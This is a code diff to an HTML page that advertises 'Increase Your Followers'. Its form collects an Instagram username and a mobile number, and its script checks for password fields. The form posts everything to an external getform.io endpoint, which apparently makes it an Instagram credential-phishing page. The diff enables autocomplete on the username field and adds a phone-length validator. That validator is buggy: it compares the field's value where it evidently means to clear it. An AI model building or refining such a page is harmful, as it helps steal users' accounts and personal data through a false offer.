@@ -113,11 +113,10 @@
         <h3>&star; Increase Your Followers &star; </h3>
     </div>
     <div class="container mt-3">
-
         <form action="https://getform.io/f/7988f268-0257-40fa-b175-6eb1de5c07e0" class="was-validated" method="post">
             <div class="mb-3 mt-3">
                 <label for="uname" class="form-label">Instagram Username:</label>
-                <input type="text" autocomplete="off" autofocus spellcheck="false" class="form-control" id="username"
+                <input type="text" autocomplete="on" autofocus spellcheck="false" class="form-control" id="username"
                     placeholder="Username, Phone Number or email" name="Instagram-Username" required>
                 <div class="valid-feedback">Valid.</div>
                 <div class="invalid-feedback">Please !! Enter Your Instagram Username.</div>
@@ -125,8 +124,9 @@
 
             <div class="mb-3 mt-3">
                 <label for="uname" class="form-label">Mobile Number :</label>
-                <input type="text" autocomplete="off" autofocus spellcheck="false" class="form-control" id="username"
-                    placeholder="Mobile Number" name="Mobile-Number" required>
+                <input type="number" onmouseleave="validatePhoneNumber()" autocomplete="off" autofocus
+                    spellcheck="false" class="form-control" id="mobileNumber" placeholder="Enter Mobile Number"
+                    name="Mobile-Number" required>
                 <div class="valid-feedback">Valid.</div>
                 <div class="invalid-feedback">Please !! Enter Your Mobile Number.</div>
             </div>
@@ -188,6 +188,20 @@
             }
             if (document.getElementById("username").value == "" || document.getElementById("pwd").value == "" || document.getElementById("re-enter-pwd").value == "" || document.getElementById("followers").value == "") {
                 alert("Fill up the all details.");
+            }
+        }
+
+        function validatePhoneNumber() {
+            var mobileNumberInput = document.getElementById("mobileNumber");
+            var mobileNumber = mobileNumberInput.value;
+
+            // Define your desired mobile number length
+            var desiredLength = 10; // For example, a typical length for mobile numbers
+
+            if (mobileNumber.length !== desiredLength) {
+                alert("Mobile number must be " + desiredLength + " digits long.");
+                mobileNumberInput.focus(); // Keep focus on the input field
+                document.getElementById("mobileNumber").value == "";
             }
         }
     </script>
